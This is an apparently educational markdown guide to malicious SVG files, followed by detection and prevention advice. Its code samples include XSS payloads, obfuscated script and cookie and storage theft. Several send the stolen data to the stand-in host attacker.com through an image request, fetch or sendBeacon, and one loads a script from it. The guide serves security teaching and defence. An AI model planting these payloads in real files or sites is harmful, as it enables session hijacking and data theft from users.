# SVG Attack Vectors - Educational Guide

> **⚠️ WARNING: This document is for educational purposes only. All examples are synthetic and designed for learning about security vulnerabilities.**

## Overview

SVG (Scalable Vector Graphics) files can contain executable JavaScript, making them powerful attack vectors for cross-site scripting (XSS) and data exfiltration. This guide covers the most common attack vectors and how they work.

## Attack Vector Categories

### 1. Script Injection

The most direct attack vector involves embedding `<script>` tags within SVG files.

#### Basic Script Injection
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red"/>
  <script>
    alert('XSS Attack!');
    console.log('Script executed from SVG');
  </script>
</svg>
```

#### Advanced Script Injection
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Steal cookies
    var cookies = document.cookie;
    console.log('Stolen cookies:', cookies);
    
    // Access localStorage
    var storage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      storage[key] = localStorage.getItem(key);
    }
    console.log('Stolen localStorage:', storage);
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

### 2. Event Handler Injection

SVG elements can have event handlers that execute JavaScript when triggered.

#### Onload Event Handler
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="green" 
        onload="alert('XSS via onload')"/>
</svg>
```

#### Multiple Event Handlers
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="yellow"
          onload="alert('onload')"
          onclick="alert('onclick')"
          onmouseover="alert('onmouseover')"/>
</svg>
```

### 3. Foreign Object Injection

The `<foreignObject>` element allows embedding HTML content within SVG, which can contain scripts.

#### Basic Foreign Object Attack
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="0" height="0">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS via foreignObject');</script>
    </div>
  </foreignObject>
  <rect width="100" height="100" fill="purple"/>
</svg>
```

#### Advanced Foreign Object Attack
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="0" height="0">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>
        // Comprehensive data theft
        var stolenData = {
          cookies: document.cookie,
          userAgent: navigator.userAgent,
          location: window.location.href,
          localStorage: (function() {
            var items = {};
            for (var i = 0; i < localStorage.length; i++) {
              var key = localStorage.key(i);
              items[key] = localStorage.getItem(key);
            }
            return items;
          })(),
          sessionStorage: (function() {
            var items = {};
            for (var i = 0; i < sessionStorage.length; i++) {
              var key = sessionStorage.key(i);
              items[key] = sessionStorage.getItem(key);
            }
            return items;
          })()
        };
        console.log('Comprehensive data theft:', stolenData);
      </script>
    </div>
  </foreignObject>
</svg>
```

### 4. External Reference Attacks

SVG files can reference external resources that may contain malicious content.

#### External Script Reference
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script href="http://attacker.com/malicious.js"/>
  <rect width="100" height="100" fill="orange"/>
</svg>
```

#### Use Element Attack
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <defs>
    <script id="malicious">
      alert('XSS via use element');
    </script>
  </defs>
  <use href="#malicious"/>
  <rect width="100" height="100" fill="pink"/>
</svg>
```

### 5. Obfuscation Techniques

Attackers use various obfuscation techniques to hide malicious code from detection systems.

#### Base64 Encoding
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var payload = 'YWxlcnQoJ1hTUyBBdHRhY2shJyk7'; // alert('XSS Attack!');
    eval(atob(payload));
  </script>
  <rect width="100" height="100" fill="brown"/>
</svg>
```

#### String Concatenation
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var cmd = 'al' + 'ert';
    var msg = 'XS' + 'S ' + 'Att' + 'ack!';
    window[cmd](msg);
  </script>
  <rect width="100" height="100" fill="gray"/>
</svg>
```

#### Variable Obfuscation
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var _0x1a2b = ['alert', 'XSS Attack!'];
    var _0x3c4d = window[_0x1a2b[0]];
    _0x3c4d(_0x1a2b[1]);
  </script>
  <rect width="100" height="100" fill="cyan"/>
</svg>
```

#### Hex Encoding
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var hex = '\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29'; // alert('XSS')
    eval(hex);
  </script>
  <rect width="100" height="100" fill="magenta"/>
</svg>
```

### 6. Data Exfiltration Techniques

SVG files can be used to steal sensitive data from the browser.

#### Cookie Theft
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var cookies = document.cookie;
    // Send to attacker's server
    var img = new Image();
    img.src = 'http://attacker.com/steal?cookies=' + encodeURIComponent(cookies);
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

#### LocalStorage Theft
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var storage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      storage[key] = localStorage.getItem(key);
    }
    // Send to attacker's server
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(storage)
    });
  </script>
  <rect width="100" height="100" fill="green"/>
</svg>
```

#### Beacon API Exfiltration
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var data = {
      cookies: document.cookie,
      userAgent: navigator.userAgent,
      location: window.location.href,
      timestamp: new Date().toISOString()
    };
    // Use Beacon API for reliable data transmission
    navigator.sendBeacon('http://attacker.com/steal', JSON.stringify(data));
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

## Attack Delivery Methods

### 1. File Upload Vulnerabilities
- Uploading malicious SVG files to websites
- Bypassing file type validation
- Exploiting insufficient sanitization

### 2. Cross-Site Request Forgery (CSRF)
- Forcing users to load malicious SVG files
- Exploiting user authentication context
- Stealing session data

### 3. Social Engineering
- Tricking users into opening malicious SVG files
- Embedding SVG in phishing emails
- Using SVG files as attack vectors in social media

### 4. Supply Chain Attacks
- Compromising legitimate SVG files
- Injecting malicious code into trusted resources
- Exploiting third-party SVG libraries

## Detection Methods

### 1. Static Analysis
- Pattern matching for suspicious strings
- Script tag detection
- Event handler identification
- Obfuscation pattern recognition

### 2. Dynamic Analysis
- Runtime behavior monitoring
- Network request analysis
- DOM manipulation detection
- JavaScript execution tracking

### 3. Content Validation
- File type verification
- Content structure analysis
- Malicious pattern scanning
- Signature-based detection

## Prevention Strategies

### 1. Content Security Policy (CSP)
- Block script execution in SVG files
- Restrict object and embed elements
- Monitor CSP violations

### 2. Input Sanitization
- Use DOMPurify or similar libraries
- Remove dangerous elements and attributes
- Validate SVG content structure

### 3. Trusted Types
- Enforce type safety for DOM assignments
- Require sanitization before use
- Prevent direct innerHTML assignment

### 4. Sandboxing
- Isolate SVG rendering in iframes
- Restrict permissions and capabilities
- Monitor for suspicious behavior

## Educational Notes

- **All examples are synthetic** and designed for educational purposes
- **Real attacks would be more sophisticated** and potentially harmful
- **Always test security measures** in controlled environments
- **Stay updated** on new attack vectors and defense mechanisms
- **Use multiple layers of protection** rather than relying on single solutions

## Resources

- [OWASP SVG Security](https://owasp.org/www-community/attacks/SVG_attack)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Trusted Types](https://web.dev/trusted-types/)

---

**Remember: Security knowledge is power. Use it responsibly to protect, not to harm.**
